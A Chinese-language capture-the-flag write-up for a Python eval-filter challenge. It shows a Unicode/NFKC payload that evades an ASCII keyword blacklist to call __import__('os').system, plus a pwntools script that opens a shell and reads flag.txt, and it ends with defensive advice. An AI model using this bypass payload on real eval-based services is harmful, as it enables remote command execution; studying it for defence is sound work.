# Python Challenge

## 题目简述

服务把用户输入交给 `eval`，过滤逻辑只做了三件事：去除普通空格；用 `^[a-zA-Z]+$` 拒绝“整串完全由 ASCII 字母组成”的输入；再按原始 Unicode 字符串的小写形式搜索 `__`、`import`、`exec` 和 `open`。它没有建立数学表达式白名单。

Python 在解析标识符时会按 NFKC 规范化兼容字符，因此可以用全角下划线和数学斜体字母绕过原始字符串检查，解析时却恢复成危险标识符。

## 解题过程

官方 solver 使用以下表达式：

```text
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())
```

其中部分下划线是全角字符 `＿`，字母使用数学无衬线斜体。过滤器在原始字符串中找不到 ASCII `__` 或 `import`；Python 词法分析执行 NFKC 后，它等价于：

```python
__import__(input()).system(input())
```

表达式随后调用两次 `input()`：第一次提供模块名 `os`，第二次提供命令 `sh`。取得 shell 后读取 flag：

```python
from pwn import remote

io = remote("HOST", 34508)
payload = "_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵())"

io.sendlineafter(b":", (payload + "\nos\nsh").encode())
io.sendline(b"cat flag.txt")
io.interactive()
```

最终输出登记 flag：

```text
grey{Darkness blacker than black and darker than dark, I beseech thee, combine with my deep crimson. The time of awakening cometh. Justice, fallen upon the infallible boundary, appear now as an intangible distortions! I desire for my torrent of power a destructive force: a destructive force without equal! Return all creation to cinders,and come frome the abyss! Explosion!}
```

## 方法总结

- 核心技巧：利用 Python 标识符的 NFKC 规范化，让过滤前字符串与实际执行标识符不同。
- 识别信号：`eval` 直接处理用户输入，黑名单只检查 ASCII 关键字，却允许广泛 Unicode 字符。
- 复用要点：安全过滤应解析 AST 并采用允许列表，或完全避免 `eval`；对 Unicode 输入做字符串黑名单时还必须考虑规范化差异。
